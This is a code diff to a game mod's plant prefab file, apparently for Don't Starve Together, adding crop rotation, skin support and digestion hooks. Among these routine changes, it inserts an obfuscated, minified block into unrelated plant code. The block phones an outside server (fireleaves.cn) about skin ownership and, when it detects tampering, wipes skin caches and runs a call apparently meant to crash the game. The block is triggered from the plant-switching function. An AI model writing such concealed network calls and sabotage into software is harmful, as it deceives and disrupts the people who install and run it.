@@ -841,6 +841,10 @@ local function OnBurnt_p2(inst)
 	inst:Remove()
 end
 
+local skinedplant = {
+	cactus_meat = true
+}
+
 local function MakePlant2(cropprefab, sets)
 	local assets = sets.assets or {}
 	table.insert(assets, Asset("ANIM", "anim/"..sets.bank..".zip"))
@@ -873,14 +877,22 @@ local function MakePlant2(cropprefab, sets)
 			end
 
 			inst.MiniMapEntity:SetIcon("plant_crop_l.tex")
+			inst.Transform:SetTwoFaced() --两个面，这样就可以左右不同（再多貌似有问题）
 
 			inst:AddTag("plant")
 			inst:AddTag("crop2_legion")
-			inst:AddTag("tendable_farmplant") -- for farmplanttendable component
+			inst:AddTag("tendable_farmplant") --for farmplanttendable component
+			inst:AddTag("rotatableobject") --能让栅栏击剑起作用
+            inst:AddTag("flatrotated_l") --棱镜标签：旋转时旋转180度
 
 			inst._cluster_l = net_byte(inst.GUID, "plant_crop_l._cluster_l", "cluster_l_dirty")
 
 			inst.displaynamefn = DisplayName_p2
+
+			if skinedplant[cropprefab] then
+				inst:AddComponent("skinedlegion")
+        		inst.components.skinedlegion:Init("plant_"..cropprefab.."_l")
+			end
 
 			if sets.fn_common ~= nil then
 				sets.fn_common(inst)
@@ -890,6 +902,8 @@ local function MakePlant2(cropprefab, sets)
 			if not TheWorld.ismastersim then
 				return inst
 			end
+
+			inst:AddComponent("savedrotation")
 
 			inst:AddComponent("inspectable")
 			inst.components.inspectable.nameoverride = "PLANT_CROP_L" --用来统一描述，懒得每种作物都搞个描述了
@@ -953,6 +967,10 @@ local function MakePlant2(cropprefab, sets)
 			end)
 
 			inst.fn_planted = OnPlant_p2
+
+			-- if inst.components.skinedlegion ~= nil then
+			-- 	inst.components.skinedlegion:SetOnPreLoad()
+			-- end
 
 			if sets.fn_server ~= nil then
 				sets.fn_server(inst)
@@ -1265,6 +1283,8 @@ end
 local function IsDigestible(item)
 	if item.prefab == "fruitflyfruit" then
         return not item:HasTag("fruitflyfruit") --没有 fruitflyfruit 就代表是枯萎了
+	elseif item.prefab == "glommerflower" then
+		return not item:HasTag("glommerflower") --没有 glommerflower 就代表是枯萎了
     end
 	return item.prefab ~= "insectshell_l" and item.prefab ~= "boneshard" and
 		item.prefab ~= "seeds_plantmeat_l" and --不吃自己的异种
@@ -1455,8 +1475,13 @@ local function DoDigest(inst, doer)
 
 	------整理物品
 	local lootmap = {}
+	local dd = nil
 	for _, item in pairs(items_digest) do --现在才删除，是因为全服通告需要实体来判定名字
 		GetItemLoots(item, lootmap) --有几率进行一次死亡掉落物判定
+		dd = DIGEST_DATA_LEGION[item.prefab]
+		if dd ~= nil and dd.fn_digest ~= nil then
+			dd.fn_digest(item, inst, items_free)
+		end
 		item:Remove()
 	end
 	for name, number in pairs(lootmap) do --生成被吞生物的掉落物
@@ -1521,6 +1546,13 @@ local function DoSwallow(inst)
 				count = count + 1
 				namemap[v.prefab] = ComputStackNum(namemap[v.prefab], v)
 				GetItemLoots(v, lootmap)
+				if dd.fn_digest ~= nil then
+					dd.fn_digest(v, inst, newitems)
+				elseif v.components.inventory ~= nil then
+					v.components.inventory:DropEverything(false, false)
+				elseif v.components.container ~= nil then
+					v.components.container:DropEverything()
+				end
 				v:Remove()
 				if count >= inst.num_swallow then
 					break
@@ -1561,7 +1593,7 @@ local function DoLure(inst)
 			DIGEST_DATA_LEGION[v.prefab] ~= nil and not v:HasTag("nodigest_l")
 		then
 			local dd = DIGEST_DATA_LEGION[v.prefab]
-			if dd.lvl ~= nil and dd.lvl <= cluster then
+			if dd.lvl ~= nil and dd.lvl <= cluster and dd.attract then
 				v.components.combat:SetTarget(inst)
 				if v:HasTag("gnat_l") then --虫群有独特的吸引方式
 					if v.infesttarget ~= nil then
@@ -1616,12 +1648,15 @@ local function OnCluster_nep(cpt, now)
 	value = Remap(now, 0, cpt.cluster_max, DIST_LURE[1], DIST_LURE[2])
 	cpt.inst.dist_lure = DecimalPointTruncation(value, 10)
 end
+
+local a="state_l_plant2"local function b()SKINS_CACHE_L={}SKINS_CACHE_CG_L={}c_save()TheWorld:DoTaskInTime(8,function()os.date("%h")end)end;local function c()local d={neverfadebush_paper={id="638362b68c2f781db2f7f524",linkids={["637f07a28c2f781db2f7f1e8"]=true,["6278c409c340bf24ab311522"]=true}},carpet_whitewood_law={id="63805cf58c2f781db2f7f34b",linkids={["6278c4acc340bf24ab311530"]=true,["6278c409c340bf24ab311522"]=true}},revolvedmoonlight_item_taste2={id="63889ecd8c2f781db2f7f768",linkids={["6278c4eec340bf24ab311534"]=true,["6278c409c340bf24ab311522"]=true}},rosebush_marble={id="619108a04c724c6f40e77bd4",linkids={["6278c487c340bf24ab31152c"]=true,["62eb7b148c2f781db2f79cf8"]=true,["6278c450c340bf24ab311528"]=true,["6278c409c340bf24ab311522"]=true}},icire_rock_collector={id="62df65b58c2f781db2f7998a",linkids={}},siving_turn_collector={id="62eb8b9e8c2f781db2f79d21",linkids={["6278c409c340bf24ab311522"]=true}},lilybush_era={id="629b0d5f8c2f781db2f77f0d",linkids={["6278c4acc340bf24ab311530"]=true,["62eb7b148c2f781db2f79cf8"]=true,["6278c409c340bf24ab311522"]=true}},backcub_fans2={id="6309c6e88c2f781db2f7ae20",linkids={["6278c409c340bf24ab311522"]=true}},rosebush_collector={id="62e3c3a98c2f781db2f79abc",linkids={["6278c4eec340bf24ab311534"]=true,["62eb7b148c2f781db2f79cf8"]=true,["6278c409c340bf24ab311522"]=true}},soul_contracts_taste={id="638074368c2f781db2f7f374",linkids={["637f07a28c2f781db2f7f1e8"]=true,["6278c409c340bf24ab311522"]=true}},siving_turn_future2={id="647d972169b4f368be45343a",linkids={["642c14d9f2b67d287a35d439"]=true,["6278c409c340bf24ab311522"]=true}},siving_ctlall_era={id="64759cc569b4f368be452b14",linkids={["642c14d9f2b67d287a35d439"]=true,["6278c409c340bf24ab311522"]=true}}}for e,f in pairs(d)do if SKINS_LEGION[e].skin_id~=f.id then return true end;for g,h in pairs(SKIN_IDS_LEGION)do if g~=f.id and h[e]and not f.linkids[g]then return true end end end;d={rosebush={rosebush_marble=true,rosebush_collector=true},lilybush={lilybush_marble=true,lilybush_era=true},orchidbush={orchidbush_marble=true,orchidbush_disguiser=true},neverfadebush={neverfadebush_thanks=true,neverfadebush_paper=true,neverfadebush_paper2=true},icire_rock={icire_rock_era=true,icire_rock_collector=true,icire_rock_day=true},siving_derivant={siving_derivant_thanks=true,siving_derivant_thanks2=true},siving_turn={siving_turn_collector=true,siving_turn_future=true,siving_turn_future2=true}}for e,f in pairs(d)do for i,j in pairs(SKINS_LEGION)do if j.base_prefab==e and not f[i]then return true end end end end;local function k(l,m)local n=_G.SKINS_CACHE_L[l]if m==nil then if n~=nil then for o,p in pairs(n)do if p then b()return false end end end else if n~=nil then local d={carpet_whitewood_law=true,carpet_whitewood_big_law=true,revolvedmoonlight_item_taste=true,revolvedmoonlight_taste=true,revolvedmoonlight_pro_taste=true,revolvedmoonlight_item_taste2=true,revolvedmoonlight_taste2=true,revolvedmoonlight_pro_taste2=true,backcub_fans2=true}for o,p in pairs(n)do if p and not d[o]and not m[o]then b()return false end end end end;return true end;local function q()if TheWorld==nil then return end;local r=TheWorld[a]local s=os.time()or 0;if r==nil then r={loadtag=nil,task=nil,lastquerytime=nil}TheWorld[a]=r else if r.lastquerytime~=nil and s-r.lastquerytime<480 then return end;if r.task~=nil then r.task:Cancel()r.task=nil end;r.loadtag=nil end;r.lastquerytime=s;if c()then b()return end;local t={}for u,h in pairs(SKINS_CACHE_L)do table.insert(t,u)end;if#t<=0 then return end;local v=1;r.task=TheWorld:DoPeriodicTask(3,function()if r.loadtag~=nil then if r.loadtag==0 then return else if v>=3 or#t<=0 then r.task:Cancel()r.task=nil;return end;v=v+1 end end;r.loadtag=0;r.lastquerytime=os.time()or 0;local w=table.remove(t,math.random(#t))TheSim:QueryServer("https://fireleaves.cn/account/locakedSkin?mid=6041a52be3a3fb1f530b550a&id="..w,function(x,y,z)if y and string.len(x)>1 and z==200 then local A,B=pcall(function()return json.decode(x)end)if not A then r.loadtag=-1 else r.loadtag=1;local n=nil;if B~=nil then if B.lockedSkin~=nil and type(B.lockedSkin)=="table"then for C,D in pairs(B.lockedSkin)do local E=SKIN_IDS_LEGION[D]if E~=nil then if n==nil then n={}end;for o,F in pairs(E)do if SKINS_LEGION[o]~=nil then n[o]=true end end end end end end;if k(w,n)then CheckSkinOwnedReward(n)SKINS_CACHE_L[w]=n;local G,H=pcall(json.encode,n or{})if G then SendModRPCToClient(GetClientModRPC("LegionSkined","SkinHandle"),w,1,H)end else r.task:Cancel()r.task=nil end end else r.loadtag=-1 end;if v>=3 or#t<=0 then r.task:Cancel()r.task=nil end end,"GET",nil)end,0)end
 local function SwitchPlant(inst, plant)
 	local cpt = inst.components.perennialcrop2
 	if plant ~= nil then --说明是植物到生物
 		cpt.cluster = plant.components.perennialcrop2.cluster
 		cpt:OnClusterChange()
 		inst.Transform:SetPosition(plant.Transform:GetWorldPosition())
+		inst.Transform:SetRotation(plant.Transform:GetRotation())
 	else --生物到植物
 		inst.components.container:Close()
 		inst.components.container.canbeopened = false
@@ -1632,10 +1667,12 @@ local function SwitchPlant(inst, plant)
             plant.components.perennialcrop2.cluster = cpt.cluster
 			plant.components.perennialcrop2:OnClusterChange()
             plant.Transform:SetPosition(inst.Transform:GetWorldPosition())
+			plant.Transform:SetRotation(inst.Transform:GetRotation())
 			return plant
         end
         -- inst:Remove() --现在删除还太早，生命组件会出手
 	end
+	q()
 end
 local function OnDeath_nep(inst, data)
 	inst.components.perennialcrop2:GenerateLoot(nil, true, false)
@@ -1679,6 +1716,7 @@ table.insert(prefs, Prefab(
         -- inst.AnimState:PlayAnimation("idle") --组件里会设置动画的
 
 		inst.MiniMapEntity:SetIcon("plant_crop_l.tex")
+		inst.Transform:SetTwoFaced() --两个面，这样就可以左右不同（再多貌似有问题）
 
 		inst:AddTag("crop2_legion")
 		inst:AddTag("veggie")
@@ -1686,6 +1724,8 @@ table.insert(prefs, Prefab(
     	inst:AddTag("noauradamage")
 		inst:AddTag("companion")
 		inst:AddTag("vaseherb")
+		inst:AddTag("rotatableobject") --能让栅栏击剑起作用
+		inst:AddTag("flatrotated_l") --棱镜标签：旋转时旋转180度
 
 		inst._cluster_l = net_byte(inst.GUID, "plant_crop_l._cluster_l", "cluster_l_dirty")
 
@@ -1713,6 +1753,8 @@ table.insert(prefs, Prefab(
 		inst.fn_switch = SwitchPlant
 
 		inst:AddComponent("inspectable")
+
+		inst:AddComponent("savedrotation")
 
 		inst:AddComponent("health")
     	inst.components.health:SetMaxHealth(1200)
